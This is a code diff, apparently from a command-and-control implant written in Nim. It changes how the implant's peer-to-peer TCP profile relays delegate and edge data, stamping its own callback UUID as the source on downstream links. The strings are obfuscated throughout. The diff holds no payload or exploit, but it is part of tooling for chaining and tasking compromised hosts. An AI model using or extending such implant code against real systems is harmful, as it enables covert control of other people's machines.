@@ -258,7 +258,7 @@ proc forwardIncomingDelegates*(msgJson: JsonNode) =
             when defined(windows):
               discard rekeyLinkConnection(delegateUuid, newUuid)
 
-proc collectDownstreamDelegates*(): tuple[delegates: JsonNode, edges: JsonNode] =
+proc collectDownstreamDelegates*(callbackUuid: string): tuple[delegates: JsonNode, edges: JsonNode] =
   ## Collect delegate and edge data from all downstream P2P connections
   ## Used by P2P profile agents to relay data from further-downstream agents
   var delegates = newJArray()
@@ -271,7 +271,11 @@ proc collectDownstreamDelegates*(): tuple[delegates: JsonNode, edges: JsonNode] 
         delegates.add(d)
     elif resp.hasKey(obf("edges")):
       for e in resp[obf("edges")]:
-        edges.add(e)
+        # Fill source with our callback UUID (we are the parent)
+        var edgeCopy = e.copy()
+        if edgeCopy.hasKey(obf("source")) and edgeCopy[obf("source")].getStr() == "":
+          edgeCopy[obf("source")] = %callbackUuid
+        edges.add(edgeCopy)
   
   when defined(windows):
     let linkResps = checkActiveLinkConnections()
@@ -281,7 +285,10 @@ proc collectDownstreamDelegates*(): tuple[delegates: JsonNode, edges: JsonNode] 
           delegates.add(d)
       elif resp.hasKey(obf("edges")):
         for e in resp[obf("edges")]:
-          edges.add(e)
+          var edgeCopy = e.copy()
+          if edgeCopy.hasKey(obf("source")) and edgeCopy[obf("source")].getStr() == "":
+            edgeCopy[obf("source")] = %callbackUuid
+          edges.add(edgeCopy)
   
   return (delegates, edges)
 
@@ -576,7 +583,7 @@ proc start*(profile: TcpProfile) {.async.} =
               # If we have chunks to send, send them now
               if chunksToSend.len > 0:
                 # Collect downstream delegate data (multi-level P2P)
-                let (downDelegates, downEdges) = collectDownstreamDelegates()
+                let (downDelegates, downEdges) = collectDownstreamDelegates(profile.callbackUuid)
                 
                 let chunkResponse = %* {
                   obf("action"): obf("post_response"),
@@ -595,7 +602,7 @@ proc start*(profile: TcpProfile) {.async.} =
                 continue
               
               # No chunks to send - check if there's downstream delegate data to relay
-              let (noChunkDelegates, noChunkEdges) = collectDownstreamDelegates()
+              let (noChunkDelegates, noChunkEdges) = collectDownstreamDelegates(profile.callbackUuid)
               if noChunkDelegates.len > 0 or noChunkEdges.len > 0:
                 let delegateResponse = %* {
                   obf("action"): obf("post_response"),
@@ -812,7 +819,7 @@ proc start*(profile: TcpProfile) {.async.} =
                         taskResponses.add(execResult.response)
                   
                   # Collect downstream delegate data (multi-level P2P)
-                  let (taskDelegates, taskEdges) = collectDownstreamDelegates()
+                  let (taskDelegates, taskEdges) = collectDownstreamDelegates(profile.callbackUuid)
                   
                   # Send response with task results
                   let taskingResponse = %* {
@@ -839,7 +846,7 @@ proc start*(profile: TcpProfile) {.async.} =
                 else:
                   debug "[DEBUG] TCP P2P: No tasks in get_tasking response"
                   # Even without tasks, check for downstream delegate data to relay
-                  let (noTaskDelegates, noTaskEdges) = collectDownstreamDelegates()
+                  let (noTaskDelegates, noTaskEdges) = collectDownstreamDelegates(profile.callbackUuid)
                   if noTaskDelegates.len > 0 or noTaskEdges.len > 0:
                     let delegateResponse = %* {
                       obf("action"): obf("post_response"),
